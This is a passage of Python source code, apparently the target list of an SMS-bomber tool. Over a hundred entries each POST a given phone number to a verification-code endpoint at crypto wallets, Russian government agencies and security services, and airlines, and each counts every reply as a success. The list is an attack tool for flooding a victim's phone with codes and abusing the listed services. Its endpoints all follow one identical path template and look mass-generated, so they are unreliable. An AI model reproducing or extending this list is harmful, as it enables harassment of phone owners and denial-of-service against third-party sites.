        "name": "Nexo",
        "url": "https://nexo.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nexo.io/", "https://nexo.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api613": {
        "name": "LedgerLive",
        "url": "https://ledger.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ledger.com/", "https://ledger.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api614": {
        "name": "TrezorSuite",
        "url": "https://trezor.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://trezor.io/", "https://trezor.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api615": {
        "name": "TrustWallet",
        "url": "https://trustwallet.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://trustwallet.com/", "https://trustwallet.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api616": {
        "name": "MetaMask",
        "url": "https://metamask.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://metamask.io/", "https://metamask.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api617": {
        "name": "ExodusWallet",
        "url": "https://exodus.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://exodus.com/", "https://exodus.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api618": {
        "name": "MyEtherWallet",
        "url": "https://myetherwallet.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://myetherwallet.com/", "https://myetherwallet.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api619": {
        "name": "PhantomWallet",
        "url": "https://phantom.app/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://phantom.app/", "https://phantom.app", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api620": {
        "name": "Solflare",
        "url": "https://solflare.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://solflare.com/", "https://solflare.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api621": {
        "name": "KeplrWallet",
        "url": "https://keplr.app/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://keplr.app/", "https://keplr.app", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api622": {
        "name": "TerraStation",
        "url": "https://terra.money/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://terra.money/", "https://terra.money", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api623": {
        "name": "CardanoDaedalus",
        "url": "https://daedaluswallet.io/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://daedaluswallet.io/", "https://daedaluswallet.io", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api624": {
        "name": "CardanoYoroi",
        "url": "https://yoroi-wallet.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yoroi-wallet.com/", "https://yoroi-wallet.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api625": {
        "name": "AlgoWallet",
        "url": "https://algorand.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://algorand.com/", "https://algorand.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api626": {
        "name": "TronLink",
        "url": "https://tronlink.org/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tronlink.org/", "https://tronlink.org", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api627": {
        "name": "Tonkeeper",
        "url": "https://tonkeeper.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tonkeeper.com/", "https://tonkeeper.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api628": {
        "name": "Kupit",
        "url": "https://kupit.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kupit.ru/", "https://kupit.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api629": {
        "name": "Prodam",
        "url": "https://prodam.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://prodam.ru/", "https://prodam.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api630": {
        "name": "TorgiRu",
        "url": "https://torgi.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://torgi.gov.ru/", "https://torgi.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api631": {
        "name": "Gosuslugi",
        "url": "https://gosuslugi.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gosuslugi.ru/", "https://gosuslugi.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api632": {
        "name": "NALOG_RU",
        "url": "https://nalog.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nalog.ru/", "https://nalog.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api633": {
        "name": "PFRF",
        "url": "https://pfr.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pfr.gov.ru/", "https://pfr.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api634": {
        "name": "FSSP",
        "url": "https://fssp.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fssp.gov.ru/", "https://fssp.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api635": {
        "name": "MVD",
        "url": "https://mvd.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mvd.ru/", "https://mvd.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api636": {
        "name": "GIBDD",
        "url": "https://gibdd.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gibdd.ru/", "https://gibdd.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api637": {
        "name": "MosRu",
        "url": "https://mos.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mos.ru/", "https://mos.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api638": {
        "name": "SPbRu",
        "url": "https://gov.spb.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://gov.spb.ru/", "https://gov.spb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api639": {
        "name": "Dobrodel",
        "url": "https://dobrodel.mosreg.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://dobrodel.mosreg.ru/", "https://dobrodel.mosreg.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api640": {
        "name": "EGRN",
        "url": "https://rosreestr.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosreestr.gov.ru/", "https://rosreestr.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api641": {
        "name": "Rospotrebnadzor",
        "url": "https://rospotrebnadzor.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rospotrebnadzor.ru/", "https://rospotrebnadzor.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api642": {
        "name": "MЧС",
        "url": "https://mchs.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mchs.gov.ru/", "https://mchs.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api643": {
        "name": "Minzdrav",
        "url": "https://minzdrav.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://minzdrav.gov.ru/", "https://minzdrav.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api644": {
        "name": "Mincifra",
        "url": "https://digital.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://digital.gov.ru/", "https://digital.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api645": {
        "name": "Minenergo",
        "url": "https://minenergo.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://minenergo.gov.ru/", "https://minenergo.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api646": {
        "name": "Mintrud",
        "url": "https://mintrud.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mintrud.gov.ru/", "https://mintrud.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api647": {
        "name": "Minpromtorg",
        "url": "https://minpromtorg.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://minpromtorg.gov.ru/", "https://minpromtorg.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api648": {
        "name": "Minkult",
        "url": "https://minkult.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://minkult.gov.ru/", "https://minkult.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api649": {
        "name": "Minsport",
        "url": "https://minsport.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://minsport.gov.ru/", "https://minsport.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api650": {
        "name": "Minobrnauki",
        "url": "https://minobrnauki.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://minobrnauki.gov.ru/", "https://minobrnauki.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api651": {
        "name": "Minstroy",
        "url": "https://minstroyrf.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://minstroyrf.gov.ru/", "https://minstroyrf.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api652": {
        "name": "Mintrans",
        "url": "https://mintrans.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mintrans.gov.ru/", "https://mintrans.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api653": {
        "name": "Minfin",
        "url": "https://minfin.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://minfin.gov.ru/", "https://minfin.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api654": {
        "name": "Mines",
        "url": "https://mnr.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mnr.gov.ru/", "https://mnr.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api655": {
        "name": "MidRu",
        "url": "https://mid.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mid.ru/", "https://mid.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api656": {
        "name": "MvdRu",
        "url": "https://mvd.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://mvd.ru/", "https://mvd.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api657": {
        "name": "Genprocuratura",
        "url": "https://genproc.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://genproc.gov.ru/", "https://genproc.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api658": {
        "name": "Sledcom",
        "url": "https://sledcom.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://sledcom.ru/", "https://sledcom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api659": {
        "name": "FSB",
        "url": "https://fsb.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fsb.ru/", "https://fsb.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api660": {
        "name": "SVR",
        "url": "https://svr.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://svr.gov.ru/", "https://svr.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api661": {
        "name": "FSO",
        "url": "https://fso.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fso.gov.ru/", "https://fso.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api662": {
        "name": "Rosguard",
        "url": "https://rosguard.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosguard.gov.ru/", "https://rosguard.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api663": {
        "name": "FSIN",
        "url": "https://fsin.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fsin.gov.ru/", "https://fsin.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api664": {
        "name": "FSSPgov",
        "url": "https://fssp.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fssp.gov.ru/", "https://fssp.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api665": {
        "name": "Rosstat",
        "url": "https://rosstat.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosstat.gov.ru/", "https://rosstat.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api666": {
        "name": "Rosprirodnadzor",
        "url": "https://rpn.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rpn.gov.ru/", "https://rpn.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api667": {
        "name": "Rostrud",
        "url": "https://rostrud.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rostrud.gov.ru/", "https://rostrud.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api668": {
        "name": "Roszdravnadzor",
        "url": "https://roszdravnadzor.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://roszdravnadzor.gov.ru/", "https://roszdravnadzor.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api669": {
        "name": "Rosselkhoznadzor",
        "url": "https://fsvps.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fsvps.gov.ru/", "https://fsvps.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api670": {
        "name": "Rospatent",
        "url": "https://rupto.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rupto.ru/", "https://rupto.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api671": {
        "name": "Rosstandart",
        "url": "https://rst.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rst.gov.ru/", "https://rst.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api672": {
        "name": "Rosakkreditatsiya",
        "url": "https://fsa.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://fsa.gov.ru/", "https://fsa.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api673": {
        "name": "Rosimushchestvo",
        "url": "https://rosimushchestvo.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosimushchestvo.gov.ru/", "https://rosimushchestvo.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api674": {
        "name": "Rosavtodor",
        "url": "https://rosavtodor.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosavtodor.gov.ru/", "https://rosavtodor.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api675": {
        "name": "Rosaviatsiya",
        "url": "https://favt.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://favt.gov.ru/", "https://favt.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api676": {
        "name": "Rosmorrechflot",
        "url": "https://morflot.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://morflot.gov.ru/", "https://morflot.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api677": {
        "name": "Rostransnadzor",
        "url": "https://rostransnadzor.gov.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rostransnadzor.gov.ru/", "https://rostransnadzor.gov.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api678": {
        "name": "Rosgidromet",
        "url": "https://meteorf.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://meteorf.ru/", "https://meteorf.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api679": {
        "name": "Rostrudin",
        "url": "https://rostrud.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rostrud.ru/", "https://rostrud.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api680": {
        "name": "Rosatom",
        "url": "https://rosatom.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rosatom.ru/", "https://rosatom.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api681": {
        "name": "Roskosmos",
        "url": "https://roscosmos.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://roscosmos.ru/", "https://roscosmos.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api682": {
        "name": "RussianPost",
        "url": "https://pochta.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pochta.ru/", "https://pochta.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api683": {
        "name": "RZD",
        "url": "https://rzd.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rzd.ru/", "https://rzd.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api684": {
        "name": "Aeroflot",
        "url": "https://aeroflot.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://aeroflot.ru/", "https://aeroflot.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api685": {
        "name": "S7Airlines",
        "url": "https://s7.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://s7.ru/", "https://s7.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api686": {
        "name": "UralAirlines",
        "url": "https://uralairlines.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uralairlines.ru/", "https://uralairlines.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api687": {
        "name": "UTairAirlines",
        "url": "https://utair.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://utair.ru/", "https://utair.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api688": {
        "name": "PobedaAirlines",
        "url": "https://pobeda.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://pobeda.aero/", "https://pobeda.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api689": {
        "name": "NordwindAirlines",
        "url": "https://nordwindairlines.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nordwindairlines.ru/", "https://nordwindairlines.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api690": {
        "name": "AzurAir",
        "url": "https://azurair.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://azurair.ru/", "https://azurair.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api691": {
        "name": "RedWings",
        "url": "https://flyredwings.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flyredwings.com/", "https://flyredwings.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api692": {
        "name": "YamalAirlines",
        "url": "https://yamal.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamal.aero/", "https://yamal.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api693": {
        "name": "AlrosaAirlines",
        "url": "https://alrosa.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://alrosa.aero/", "https://alrosa.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api694": {
        "name": "YakutiaAirlines",
        "url": "https://yakutia.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yakutia.aero/", "https://yakutia.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api695": {
        "name": "NordStar",
        "url": "https://nordstar.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nordstar.ru/", "https://nordstar.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api696": {
        "name": "IkarAirlines",
        "url": "https://karat.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://karat.ru/", "https://karat.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api697": {
        "name": "Smartavia",
        "url": "https://flysmartavia.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flysmartavia.com/", "https://flysmartavia.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api698": {
        "name": "AzimuthAirlines",
        "url": "https://azimuth.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://azimuth.aero/", "https://azimuth.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api699": {
        "name": "I-Fly",
        "url": "https://ifly.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://ifly.aero/", "https://ifly.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api700": {
        "name": "RusLine",
        "url": "https://rusline.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://rusline.aero/", "https://rusline.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api701": {
        "name": "AngaraAirlines",
        "url": "https://angara.aero/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://angara.aero/", "https://angara.aero", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api702": {
        "name": "KrasAvia",
        "url": "https://krasavia.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://krasavia.ru/", "https://krasavia.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api703": {
        "name": "AuroraAirlines",
        "url": "https://flyaurora.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flyaurora.ru/", "https://flyaurora.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api704": {
        "name": "KostromaAir",
        "url": "https://kostroma-avia.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kostroma-avia.ru/", "https://kostroma-avia.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api705": {
        "name": "UVT_Aero",
        "url": "https://uvtaero.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uvtaero.ru/", "https://uvtaero.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api706": {
        "name": "PolarAirlines",
        "url": "https://polarair.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://polarair.ru/", "https://polarair.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api707": {
        "name": "ChukotAvia",
        "url": "https://chukotavia.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://chukotavia.ru/", "https://chukotavia.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api708": {
        "name": "PetropavlovskAir",
        "url": "https://kamchatka-avia.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://kamchatka-avia.ru/", "https://kamchatka-avia.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api709": {
        "name": "KhabarovskAir",
        "url": "https://Khabarovsk-avia.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://Khabarovsk-avia.ru/", "https://Khabarovsk-avia.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api710": {
        "name": "NaryanMarAir",
        "url": "https://nariman-avia.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://nariman-avia.ru/", "https://nariman-avia.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api711": {
        "name": "YamalAvia",
        "url": "https://yamal-avia.ru/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://yamal-avia.ru/", "https://yamal-avia.ru", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api712": {
        "name": "AviaTraffic",
        "url": "https://www.aero.kg/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://www.aero.kg/", "https://www.aero.kg", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api713": {
        "name": "AirAstana",
        "url": "https://airastana.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://airastana.com/", "https://airastana.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api714": {
        "name": "SCAT_Airlines",
        "url": "https://scat.kz/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://scat.kz/", "https://scat.kz", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api715": {
        "name": "QazaqAir",
        "url": "https://flyqazaq.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://flyqazaq.com/", "https://flyqazaq.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api716": {
        "name": "Belavia",
        "url": "https://belavia.by/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://belavia.by/", "https://belavia.by", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api717": {
        "name": "UzbekistanAirways",
        "url": "https://uzairways.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://uzairways.com/", "https://uzairways.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api718": {
        "name": "SomonAir",
        "url": "https://somonair.com/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://somonair.com/", "https://somonair.com", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api719": {
        "name": "TajikAir",
        "url": "https://tajikair.tj/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://tajikair.tj/", "https://tajikair.tj", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api720": {
        "name": "TurkmenistanAirlines",
        "url": "https://turkmenistanairlines.tm/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://turkmenistanairlines.tm/", "https://turkmenistanairlines.tm", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api721": {
        "name": "AzerbaijanAirlines",
        "url": "https://azal.az/api/v1/auth/code",
        "method": "POST",
        "headers": lambda: get_common_headers("https://azal.az/", "https://azal.az", "application/json"),
        "data": lambda p: {"phone": p},
        "success_check": lambda r: True
    },
    "api722": {
        "name": "GeorgianAirways",
        "url": "https://georgian-airways.com/api/v1/auth/code",
        "method": "POST",
